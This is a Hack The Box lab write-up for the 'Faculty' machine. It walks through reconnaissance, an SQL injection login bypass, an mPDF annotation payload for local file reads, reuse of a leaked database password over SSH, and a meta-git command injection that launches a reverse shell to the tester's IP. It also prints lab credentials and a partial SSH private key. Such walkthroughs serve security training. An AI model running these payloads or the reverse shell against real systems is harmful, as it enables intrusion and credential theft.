---
title: "HTB Writeup: Faculty [Medium]"
summary: "A medium rated box, with LFI and privilege escalation trough gdb."
tags: ["htb", "writeup", "medium"]
#externalUrl: ""
showSummary: true
date: 2023-01-19
draft: false
---

# Faculty

## Reconnaissance

### NMAP
```nmap``` scans two open ports ```ssh(22)``` and ```http(80)``` 

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.129.91.184
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 21:22 CEST
Nmap scan report for 10.129.91.184
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/2%OT=22%CT=1%CU=35917%PV=Y%DS=2%DC=T%G=Y%TM=62C09AF9
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   29.62 ms 10.10.14.1
2   25.21 ms 10.129.91.184

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.09 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.91.184
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 21:21 CEST
Nmap scan report for 10.129.91.184
Host is up (0.027s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1119.23 seconds
```


### DNS

The webservice on port 80 redirects to ```faculty.htb```, so I've added it to my ```/etc/hosts```


```
┌──(kali㉿kali)-[~/ctf/htb/faculty]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.91.184   faculty.htb
```

Subdomain Enumeration was not successful:

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.faculty.htb" -u http://faculty.htb/  -fw 4  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://faculty.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.faculty.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 1518 req/sec :: Duration: [0:01:22] :: Errors: 0 ::

```

### HTTP Port 80

The webpage displays just a  simple login form:
```
Welcome To Faculty Scheduling System
Please enter your Faculty ID No.
```

With ```gobuster``` we can brute force the webserver directory and discover the admin panel ```/admin```


```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k -u http://faculty.htb -e -s 200 -no-status 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://faculty.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2022/07/02 21:27:20 Starting gobuster in directory enumeration mode
===============================================================
http://faculty.htb/admin                [Size: 178] [--> http://faculty.htb/admin/]
```

## Footbold

http://faculty.htb/admin/login.php has a ```SQL Injection Vulnerability```, we can use to bypass the login with a simple ```admin' -- -``` payload.

The exploit is also stored on ```ExploitDB``` https://www.exploit-db.com/exploits/48922

Browsing to http://faculty.htb/admin/index.php?page=faculty reveals three possible users:

| Email  | Contact  |  ID |
|---|---|---|
| cblake@faculty.htb  | (763) 450-0121  | 85662050  |
| ejames@faculty.htb  | (702) 368-3689  |  30903070 |
| jsmith@faculty.htb  | (646) 559-9192  | 63033226  |


### Fuzzing
Fuzzing PHP Parameters, no additional value:
```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://faculty.htb/admin/index.php?page=FUZZ" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://faculty.htb/admin/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 :: Header           : Cookie: PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 2644
________________________________________________

users                   [Status: 200, Size: 12650, Words: 1690, Lines: 387, Duration: 29ms]
faculty                 [Status: 200, Size: 19591, Words: 1958, Lines: 535, Duration: 40ms]
courses                 [Status: 200, Size: 20273, Words: 2012, Lines: 535, Duration: 50ms]
schedule                [Status: 200, Size: 16613, Words: 2278, Lines: 518, Duration: 34ms]
%20                     [Status: 200, Size: 14061, Words: 2645, Lines: 422, Duration: 27ms]
subjects                [Status: 200, Size: 21338, Words: 2013, Lines: 549, Duration: 31ms]
4%20color%2099%20it2    [Status: 200, Size: 14074, Words: 2647, Lines: 422, Duration: 50ms]
privacy%20policy        [Status: 200, Size: 14074, Words: 2645, Lines: 422, Duration: 32ms]
msnbc%20interactive     [Status: 200, Size: 14077, Words: 2645, Lines: 422, Duration: 36ms]
picture%201             [Status: 200, Size: 14069, Words: 2645, Lines: 422, Duration: 66ms]
contact%20us            [Status: 200, Size: 14070, Words: 2645, Lines: 422, Duration: 34ms]
msnbc10%20section%20front%20headers [Status: 200, Size: 14089, Words: 2647, Lines: 422, Duration: 31ms]
case%20studies          [Status: 200, Size: 14072, Words: 2645, Lines: 422, Duration: 46ms]
windows%20xp            [Status: 200, Size: 14070, Words: 2645, Lines: 422, Duration: 46ms]
launch%20images         [Status: 200, Size: 14073, Words: 2645, Lines: 422, Duration: 33ms]
news%20and%20events     [Status: 200, Size: 14075, Words: 2646, Lines: 422, Duration: 34ms]
best-of%20amitabh       [Status: 200, Size: 14075, Words: 2645, Lines: 422, Duration: 32ms]
second%20life           [Status: 200, Size: 14071, Words: 2645, Lines: 422, Duration: 29ms]
open%20source           [Status: 200, Size: 14071, Words: 2645, Lines: 422, Duration: 41ms]
press%20releases        [Status: 200, Size: 14074, Words: 2645, Lines: 422, Duration: 42ms]
code%20monkey           [Status: 200, Size: 14071, Words: 2645, Lines: 422, Duration: 52ms]
picture%202             [Status: 200, Size: 14069, Words: 2645, Lines: 422, Duration: 51ms]
picture%203-7           [Status: 200, Size: 14071, Words: 2645, Lines: 422, Duration: 28ms]
standard%20component%20icons [Status: 200, Size: 14084, Words: 2646, Lines: 422, Duration: 31ms]
local%20settings        [Status: 200, Size: 14074, Words: 2645, Lines: 422, Duration: 31ms]
pure%20pwnage%20vs      [Status: 200, Size: 14074, Words: 2646, Lines: 422, Duration: 36ms]
about%20us              [Status: 200, Size: 14068, Words: 2645, Lines: 422, Duration: 34ms]
dj%20mexico%20presents%20-%20gutta%20niggas%20vol [Status: 200, Size: 14097, Words: 2650, Lines: 422, Duration: 36ms]
land%20rover            [Status: 200, Size: 14070, Words: 2645, Lines: 422, Duration: 33ms]
book%20%2d%20computer%20%2d%20perl [Status: 200, Size: 14082, Words: 2648, Lines: 422, Duration: 32ms]
united%20kingdom        [Status: 200, Size: 14074, Words: 2645, Lines: 422, Duration: 30ms]
grand%20theft%20auto    [Status: 200, Size: 14076, Words: 2646, Lines: 422, Duration: 34ms]
mac%20filter1165397052661 [Status: 200, Size: 14083, Words: 2645, Lines: 422, Duration: 36ms]
extended%20html%20form%20attack [Status: 200, Size: 14085, Words: 2647, Lines: 422, Duration: 60ms]
:: Progress: [81643/81643] :: Job [1/1] :: 934 req/sec :: Duration: [0:01:19] :: Errors: 0 ::
```

Fuzzing for other PHP files, was not that helpful:
```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://faculty.htb/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://faculty.htb/admin/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 :: Header           : Cookie: PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 2644
________________________________________________

home                    [Status: 200, Size: 2995, Words: 1006, Lines: 106, Duration: 40ms]
download                [Status: 200, Size: 17, Words: 17, Lines: 2, Duration: 50ms]
login                   [Status: 302, Size: 5618, Words: 376, Lines: 176, Duration: 33ms]
events                  [Status: 500, Size: 1193, Words: 51, Lines: 43, Duration: 41ms]
header                  [Status: 200, Size: 2691, Words: 155, Lines: 48, Duration: 29ms]
users                   [Status: 200, Size: 1593, Words: 52, Lines: 71, Duration: 23ms]
faculty                 [Status: 200, Size: 8532, Words: 320, Lines: 219, Duration: 29ms]
courses                 [Status: 200, Size: 9214, Words: 374, Lines: 219, Duration: 30ms]
ajax                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
schedule                [Status: 200, Size: 5553, Words: 640, Lines: 202, Duration: 34ms]
navbar                  [Status: 200, Size: 1116, Words: 47, Lines: 29, Duration: 29ms]
subjects                [Status: 200, Size: 10278, Words: 375, Lines: 233, Duration: 27ms]
topbar                  [Status: 200, Size: 1201, Words: 199, Lines: 38, Duration: 25ms]
:: Progress: [81643/81643] :: Job [1/1] :: 1330 req/sec :: Duration: [0:00:59] :: Errors: 0 ::
```

### Download Function

There is a download function which allows us to export lists as PDF.

The function calls http://faculty.htb/admin/download.php and when we intercept the Request:
```
POST /admin/download.php HTTP/1.1
Host: faculty.htb
Content-Length: 2612
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://faculty.htb
Referer: http://faculty.htb/admin/index.php?page=courses
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ou362l5jlhl6l482imvgbl0nb2
Connection: close

pdf=JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VDb3Vyc2VzJTI1M0MlMjUyRmgyJTI1M0UlMjUzQ3RhYmxlJTI1M0UlMjUwOSUyNTNDdGhlYWQlMjUzRSUyNTA5JTI1MDklMjUzQ3RyJTI1M0UlMjUwOSUyNTA5JTI1MDklMjUzQ3RoJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1MjMlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VDb3Vyc2UlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VEZXNjcmlwdGlvbiUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0MlMjUyRnRyJTI1M0UlMjUzQyUyNTJGdGhlYWQlMjUzRSUyNTNDdGJvZHklMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UxJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VJbmZvcm1hdGlvbiUyQlRlY2hub2xvZ3klMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VJVCUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0MlMjUyRnRyJTI1M0UlMjUzQ3RyJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFMiUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFQlNDUyUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ3NtYWxsJTI1M0UlMjUzQ2IlMjUzRUJhY2hlbG9yJTJCb2YlMkJTY2llbmNlJTJCaW4lMkJDb21wdXRlciUyQlNjaWVuY2UlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnNtYWxsJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0N0ciUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRTMlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ2IlMjUzRUJTSVMlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VCYWNoZWxvciUyQm9mJTJCU2NpZW5jZSUyQmluJTJCSW5mb3JtYXRpb24lMkJTeXN0ZW1zJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0U0JTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VCU0VEJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFQmFjaGVsb3IlMkJpbiUyQlNlY29uZGFyeSUyQkVkdWNhdGlvbiUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0MlMjUyRnRyJTI1M0UlMjUzQyUyNTJGdGJvYnklMjUzRSUyNTNDJTI1MkZ0YWJsZSUyNTNF
```

With ```CyberChef``` we can decode base64 and double URL decode the data:

```
<h1><a name="top"></a>faculty.htb</h1><h2>Courses</h2><table>	<thead>		<tr>			<th class="text-center">#</th>			<th class="text-center">Course</th>			<th class="text-center">Description</th>			</tr></thead><tbody><tr><td class="text-center">1</td><td class="text-center"><b>Information Technology</b></td><td class="text-center"><small><b>IT</b></small></td></tr><tr><td class="text-center">2</td><td class="text-center"><b>BSCS</b></td><td class="text-center"><small><b>Bachelor of Science in Computer Science</b></small></td></tr><tr><td class="text-center">3</td><td class="text-center"><b>BSIS</b></td><td class="text-center"><small><b>Bachelor of Science in Information Systems</b></small></td></tr><tr><td class="text-center">4</td><td class="text-center"><b>BSED</b></td><td class="text-center"><small><b>Bachelor in Secondary Education</b></small></td></tr></tboby></table>
```

If we append a simple ```<img src="http://10.10.14.173/POC"> ``` we an check for HTML injection execution:

And it is working:
```
┌──(kali㉿kali)-[~]
└─$ python3 -m updog -p 80
[+] Serving /home/kali...
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://192.168.178.89:80/ (Press CTRL+C to quit)
10.129.91.184 - - [03/Jul/2022 00:24:34] "GET / HTTP/1.0" 200 -
10.129.91.184 - - [03/Jul/2022 00:24:34] "GET / HTTP/1.0" 200 -
10.129.91.184 - - [03/Jul/2022 00:24:56] "GET /POC HTTP/1.0" 302 -
10.129.91.184 - - [03/Jul/2022 00:24:57] "GET / HTTP/1.0" 200 -
10.129.91.184 - - [03/Jul/2022 00:24:57] "GET /POC HTTP/1.0" 302 -
10.129.91.184 - - [03/Jul/2022 00:24:57] "GET / HTTP/1.0" 200 -

```
PDFs get saved at http://faculty.htb/mpdf/tmp/[RANDOM].pdf
The issue tracked at  https://github.com/mpdf/mpdf/issues/949 indicated that there might be a vulnerability with PHP deserialization through phar:// wrapper.




Okay I tested around A LOT - until I noticed, that the file needs to be loaded with the phar:// wrapper which is not possible remotely and there is no upload functionality on the website.

BUT, there is a LFI: https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f

Appending ```<annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />``` to the payload and encoding it, will create an Annotation within the PDF which contains the /etc/passwd
 
With ```Atril Document Viewer``` we can open the PDF and ```right-click``` on the Annotiation and Save the Attachment/File
 
```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

SSH is running, lets check for ```SSH Keys```
No Luck for both users. Lets see if we can get some ```DB credentials``` and check for password reuse.

Checking ```login.php``` with the LFI:
```
<annotation file="login.php" content="login.php"  icon="Graph" title="Attached File: login.php" pos-x="195" />
```
```login.php``` includes a ```db_connect.php```, which is located within the same directory.
```
include('./db_connect.php');
```
Lets grab ```db_connect.php```:
```
<annotation file="db_connect.php" content="db_connect.php"  icon="Graph" title="Attached File: db_connect.php" pos-x="195" />
```
The file contains DB credentials:
```
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```
| Username  | Password  |
|---|---|
| sched  | Co.met06aci.dly53ro.per  |

Okay lets check for ```credential reuse```: 

YES - we got SSH, but no user.txt yet.

| Username  | Password  |
|---|---|
| gbyolo  | Co.met06aci.dly53ro.per  |
```
┌──(kali㉿kali)-[~]
└─$ ssh gbyolo@faculty.htb
gbyolo@faculty.htb's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  3 01:32:30 CEST 2022

  System load:           0.03
  Usage of /:            79.2% of 4.67GB
  Memory usage:          49%
  Swap usage:            0%
  Processes:             172
  Users logged in:       1
  IPv4 address for eth0: 10.129.91.184
  IPv6 address for eth0: dead:beef::250:56ff:fe96:f911


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Sun Jul  3 01:09:13 2022 from 10.10.14.173
gbyolo@faculty:~$ 
```

## Privilege Escalation


```
gbyolo@faculty:/var/mail$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git

```

We've also got Mail!
```
gbyolo@faculty:/var/mail$ cat gbyolo 
From developer@faculty.htb  Tue Nov 10 15:03:02 2020
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
        id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
```
### Lateral Movement

We can run ```meta-git``` as user ```developer```:
```
gbyolo@faculty:/tmp/tests$ sudo -l
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```
So we are on the right track with the ```meta-git``` in ```sudo -l```

Following this report we can exploit a ```code injection vulnerability```
https://hackerone.com/reports/728040



```
gbyolo@faculty:/tmp$ chmod +x shell.sh 
gbyolo@faculty:/tmp$ cat shell.sh 
sh -i >& /dev/tcp/10.10.14.173/9001 0>&1
gbyolo@faculty:/tmp$ sudo -u developer meta-git clone 'tests||bash /tmp/shell.sh'
meta git cloning into 'tests||bash /tmp/shell.sh' at shell.sh

shell.sh:
fatal: repository 'tests' does not exist
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.91.184.
Ncat: Connection from 10.129.91.184:46850.
$ whoami
developer
$ 
```

Browsing through the home directory we can find a ssh key of developer and stablize the shell:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxDAgrHcD2I4U329//sdapn4ncVzRYZxACC/czxmSO5Us2S87dxyw
izZ0hDszHyk+bCB5B1wvrtmAFu2KN4aGCoAJMNGmVocBnIkSczGp/zBy0pVK6H7g6GMAVS
pribX/DrdHCcmsIu7WqkyZ0mDN2sS+3uMk6I3361x2ztAG1aC9xJX7EJsHmXDRLZ8G1Rib
KpI0WqAWNSXHDDvcwDpmWDk+NlIRKkpGcVByzhG8x1azvKWS9G36zeLLARBP43ax4eAVrs
Ad+7ig3vl9Iv+ZtRzkH0PsMhriIlHBNUy9dFAGP5aa4ZUkYHi1/MlBnsWOgiRHMgcJzcWX
OGeIJbtcdp2aBOjZlGJ+G6uLWrxwlX9anM3gPXTT4DGqZV1Qp/3+JZF19/KXJ1dr0i328j
saMlzDijF5bZjpAOcLxS0V84t99R/7bRbLdFxME/0xyb6QMKcMDnLrDUmdhiObROZFl3v5
hnsW9CoFLiKE/4jWKP6lPU+31GOTpKtLXYMDbcepAAAFiOUui47lLouOAAAAB3NzaC1yc2
EAAAGBAMQwIKx3A9iOFN9vf/7HWqZ+J3Fc0WGcQAgv3M8ZkjuVLNkvO3ccsIs2dIQ7Mx8p
PmwgeQdcL67ZgBbtijeGhgqACTDRplaHAZyJEnMxqf8wctKVSuh+4OhjAFUqa4m1/w63Rw
